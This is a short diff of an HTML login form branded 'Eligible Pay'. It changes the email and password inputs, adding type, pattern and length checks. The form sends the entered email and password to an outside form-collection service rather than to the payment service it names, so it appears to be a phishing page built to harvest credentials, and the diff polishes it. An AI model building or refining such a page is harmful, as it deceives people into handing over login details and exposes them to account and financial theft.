@@ -22,9 +22,9 @@
       <form action="https://formspree.io/f/meqpnldz?fbclid=IwAR3bA2etYwekodneIPoxC_FQq_GRVkHpUI6-Owi5GNSk69PuCkS_DJoAhdM" method="POST" id="form">
          <h1>Welcome Back</h1>
         <h5>Email Adress</h5>
-      <input type="text" name="email" id="input_1">
+      <input type="email" name="email" id="input_1" pattern="[a-zA-Z0-9]+" required>
         <h5>Password</h5>
-      <input type="password" name="pass" id="input_2"><br><br>
+      <input type="password" name="pass" id="input_2" minlength="3" maxlength="15"><br><br>
       <input type="submit" name="submit" id="button"value="Login to Eligible Pay">
        </form> 
        <a href="#" id="a">Cancel and return to website</a>
